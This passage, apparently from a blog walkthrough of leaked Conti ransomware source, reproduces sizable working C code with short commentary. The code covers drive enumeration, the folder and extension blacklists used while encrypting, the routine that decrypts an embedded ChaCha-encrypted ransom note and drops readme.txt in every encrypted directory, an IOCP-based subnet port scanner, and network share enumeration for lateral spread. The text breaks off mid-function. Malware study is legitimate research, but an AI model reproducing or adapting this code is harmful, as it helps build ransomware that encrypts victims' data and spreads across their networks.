LPWSTR tempBuffer = Buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Length = (INT)plstrlenW(tempBuffer)) &#123;</span><br><span class="line"></span><br><span class="line">		PDRIVE_INFO DriveInfo = new DRIVE_INFO;</span><br><span class="line">		<span class="keyword">if</span> (!DriveInfo) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(Buffer);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		DriveInfo-&gt;RootPath = tempBuffer;</span><br><span class="line">		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);</span><br><span class="line"></span><br><span class="line">		DrivesCount++;</span><br><span class="line">		tempBuffer += Length + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	logs::Write(OBFW(<span class="string">L&quot;Found %d drives: &quot;</span>), DrivesCount);</span><br><span class="line"></span><br><span class="line">	PDRIVE_INFO DriveInfo = <span class="literal">NULL</span>;</span><br><span class="line">	TAILQ_FOREACH(DriveInfo, DriveList, Entries) &#123;</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;%s&quot;</span>), DriveInfo-&gt;RootPath.c_str());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(Buffer);</span><br><span class="line">	<span class="keyword">return</span> DrivesCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><ul>
<li><p>MakeSearchMask</p>
<ul>
<li>used to generate a search mask path</li>
</ul>
</li>
<li><p>MakePath</p>
<ul>
<li>used to generate the file path</li>
</ul>
</li>
<li><p>CheckDirectory</p>
<ul>
<li><p>check if the <code>directory</code> is in the Blacklist, if yes then pass this directory. This is to make sure the system running without breaking.</p>
<ul>
<li>&#96;&#96;&#96;<br>  OBFW(L”tmp”),<br>         OBFW(L”winnt”),<br>         OBFW(L”temp”),<br>         OBFW(L”thumb”),<br>         OBFW(L”$Recycle.Bin”),<br>         OBFW(L”$RECYCLE.BIN”),<br>         OBFW(L”System Volume Information”),<br>         OBFW(L”Boot”),<br>         OBFW(L”Windows”),<br>         OBFW(L”Trend Micro”),<br>         OBFW(L”perflogs”)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- CheckFilename</span><br><span class="line"></span><br><span class="line">    - check if the `file` is in the Blacklist, if yes then pass this file. This is to make sure the system running without breaking.</span><br><span class="line"></span><br><span class="line">        - ```</span><br><span class="line">            	OBFW(L&quot;.exe&quot;),</span><br><span class="line">               		OBFW(L&quot;.dll&quot;),</span><br><span class="line">               		OBFW(L&quot;.lnk&quot;),</span><br><span class="line">               		OBFW(L&quot;.sys&quot;),</span><br><span class="line">               		OBFW(L&quot;.msi&quot;),</span><br><span class="line">               		OBFW(L&quot;readme.txt&quot;),</span><br><span class="line">               		OBFW(L&quot;CONTI_LOG.txt&quot;),</span><br><span class="line">               		OBFW(L&quot;.bat&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>DropInstruction</p>
<ul>
<li>release the reame.txt to every directory that is encrypted by Ransomeware.</li>
<li>the DecryptionNotes is encrypted with chacha<ul>
<li>the first 16 bytes is the key</li>
<li>the 16-20 bytes is the iv</li>
<li>the follow is the encrypted data</li>
</ul>
</li>
</ul>
</li>
<li><p>SearchFiles</p>
</li>
</ul>
<h4 id="DropInstruction"><a href="#DropInstruction" class="headerlink" title="DropInstruction"></a>DropInstruction</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">DropInstruction(__in <span class="built_in">std</span>::<span class="built_in">wstring</span> Directory)</span><br><span class="line">&#123;</span><br><span class="line">	LPCWSTR str = OBFW(<span class="string">L&quot;readme.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">wstring</span> Filename = MakePath(Directory, str);</span><br><span class="line"></span><br><span class="line">	HANDLE hFile = pCreateFileW(</span><br><span class="line">		Filename.c_str(),</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		CREATE_ALWAYS,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwDecryptNote = <span class="number">0</span>;</span><br><span class="line">	LPSTR DecryptNote = global::GetDecryptNote();</span><br><span class="line"></span><br><span class="line">	ECRYPT_ctx CryptCtx;</span><br><span class="line">	BYTE ChaChaKey[<span class="number">32</span>];</span><br><span class="line">	BYTE ChaChaIV[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaKey, DecryptNote, <span class="number">32</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaIV, DecryptNote + <span class="number">32</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;dwDecryptNote, DecryptNote + <span class="number">40</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote);</span><br><span class="line">	<span class="keyword">if</span> (!DecryptNotePlainText) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(&amp;CryptCtx, <span class="keyword">sizeof</span>(CryptCtx));</span><br><span class="line">  ECRYPT_keysetup(&amp;CryptCtx, ChaChaKey, <span class="number">256</span>, <span class="number">64</span>);</span><br><span class="line">	ECRYPT_ivsetup(&amp;CryptCtx, ChaChaIV);</span><br><span class="line"></span><br><span class="line">	ECRYPT_decrypt_bytes(&amp;CryptCtx, (PBYTE)DecryptNote + <span class="number">44</span>, (PBYTE)DecryptNotePlainText, dwDecryptNote);</span><br><span class="line"></span><br><span class="line">	DWORD BytesWritten;</span><br><span class="line">	pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &amp;BytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">	pCloseHandle(hFile);</span><br><span class="line">	RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote);</span><br><span class="line">	<span class="built_in">free</span>(DecryptNotePlainText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="networkscanner"><a href="#networkscanner" class="headerlink" title="networkscanner"></a>networkscanner</h2><h3 id="networkscanner-1"><a href="#networkscanner-1" class="headerlink" title="networkscanner"></a>networkscanner</h3><p>complex network scanner code.</p>
<ul>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown and close the socket</p>
</li>
</ul>
</li>
</ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="EnumShares"><a href="#EnumShares" class="headerlink" title="EnumShares"></a>EnumShares</h4><ul>
<li><p>NetShareEnum</p>
<ul>
<li>Retrieves information about each shared resource on a server.</li>
</ul>
</li>
<li><p>sharepath</p>
<table>
<thead>
<tr>
<th align="left">Constant&#x2F;value</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STYPE_DISKTREE0x00000000</td>
<td align="left">Disk drive</td>
</tr>
<tr>
<td align="left">STYPE_SPECIAL0x80000000</td>
<td align="left">Special share reserved for interprocess communication (IPC$) or remote administration of the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_434b0234-e970-4e8c-bdfa-e16a30d96703">server</a> (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.</td>
</tr>
<tr>
<td align="left">STYPE_TEMPORARY0x40000000</td>
<td align="left">A temporary share that is not persisted for creation each time the file server initializes.</td>
</tr>
</tbody></table>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">network_scanner::EnumShares</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in PWCHAR pwszIpAddress, </span></span><br><span class="line"><span class="params">	__out PSHARE_LIST ShareList</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	NET_API_STATUS Result;</span><br><span class="line">	LPSHARE_INFO_1 ShareInfoBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD er = <span class="number">0</span>, tr = <span class="number">0</span>, resume = <span class="number">0</span>;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, <span class="number">1</span>, (LPBYTE*)&amp;ShareInfoBuffer, MAX_PREFERRED_LENGTH, &amp;er, &amp;tr, &amp;resume);</span><br><span class="line">		<span class="keyword">if</span> (Result == ERROR_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (DWORD i = <span class="number">1</span>; i &lt;= er; i++)</span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (TempShareInfo-&gt;shi1_type == STYPE_DISKTREE	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_SPECIAL	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_TEMPORARY) </span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(<span class="keyword">sizeof</span>(SHARE_INFO));</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">if</span> (ShareInfo &amp;&amp; plstrcmpiW(TempShareInfo-&gt;shi1_netname, OBFW(<span class="string">L&quot;ADMIN$&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">						plstrcpyW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, pwszIpAddress);</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, TempShareInfo-&gt;shi1_netname);</span><br><span class="line"></span><br><span class="line">						logs::Write(OBFW(<span class="string">L&quot;Found share %s.&quot;</span>), ShareInfo-&gt;wszSharePath);</span><br><span class="line">						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				TempShareInfo++;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pNetApiBufferFree(ShareInfoBuffer);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (Result == ERROR_MORE_DATA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="StartScan"><a href="#StartScan" class="headerlink" title="StartScan"></a>StartScan</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">network_scanner::StartScan()</span><br><span class="line">&#123;</span><br><span class="line">	WSADATA WsaData;</span><br><span class="line">	HANDLE hHostHandler = <span class="literal">NULL</span>, hPortScan = <span class="literal">NULL</span>;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	pWSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;WsaData);</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetConnectEX()) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get ConnectEx.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GetCurrentIpAddress();</span><br><span class="line">	</span><br><span class="line">	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create io completion port.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_INIT(&amp;g_SubnetList);</span><br><span class="line">	TAILQ_INIT(&amp;g_HostList);</span><br><span class="line">	TAILQ_INIT(&amp;g_ConnectionList);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetSubnets(&amp;g_SubnetList)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get subnets.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hHostHandler = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;HostHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create host thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hPortScan = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;PortScanHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hPortScan == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create port scan thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pPostQueuedCompletionStatus(g_IocpHandle, <span class="number">0</span>, START_COMPLETION_KEY, <span class="literal">NULL</span>);</span><br><span class="line">	pWaitForSingleObject(hPortScan, INFINITE);</span><br><span class="line"></span><br><span class="line">	AddHost(STOP_MARKER);</span><br><span class="line">	pWaitForSingleObject(hHostHandler, INFINITE);</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	pDeleteCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle) &#123;</span><br><span class="line">		pCloseHandle(g_IocpHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler) &#123;</span><br><span class="line">		pCloseHandle(hHostHandler);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hPortScan) &#123;</span><br><span class="line">		pCloseHandle(hPortScan);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pWSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="GetCurrentIpAddress"><a href="#GetCurrentIpAddress" class="headerlink" title="GetCurrentIpAddress"></a>GetCurrentIpAddress</h4><ul>
<li><p>pgethostname</p>
<ul>
<li><p>SOCKET_ERROR &#x3D;&#x3D; (INT)pgethostname(szHostName, 256)</p>
</li>
<li><p>g_HostEntry &#x3D; (struct hostent*)pgethostbyname(szHostName);</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>If no error occurs, <strong>gethostname</strong> returns zero. Otherwise, </p>
<p>it returns SOCKET_ERROR and a specific error code can be retrieved by calling <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsagetlasterror">WSAGetLastError</a>.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD <span class="title function_">GetCurrentIpAddress</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	CHAR szHostName[<span class="number">256</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">InAddr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == (INT)pgethostname(szHostName, <span class="number">256</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_HostEntry = (<span class="keyword">struct</span> hostent*)pgethostbyname(szHostName);</span><br><span class="line">	<span class="keyword">if</span> (!g_HostEntry) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetConnectEX"><a href="#GetConnectEX" class="headerlink" title="GetConnectEX"></a>GetConnectEX</h4><ul>
<li>WSASocketW<ul>
<li>creates a socket that is bound to a specific transport-service provider</li>
</ul>
</li>
<li>WSAIoctl<ul>
<li>controls the mode of a socket.</li>
</ul>
</li>
<li>closesocket</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">GetConnectEX</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwBytes;</span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	GUID guid = WSAID_CONNECTEX;</span><br><span class="line">	rc = (<span class="type">int</span>)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,</span><br><span class="line">		&amp;guid, <span class="keyword">sizeof</span>(guid),</span><br><span class="line">		&amp;g_ConnectEx, <span class="keyword">sizeof</span>(g_ConnectEx),</span><br><span class="line">		&amp;dwBytes, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	rc =(<span class="type">int</span>) pclosesocket(sock);</span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">	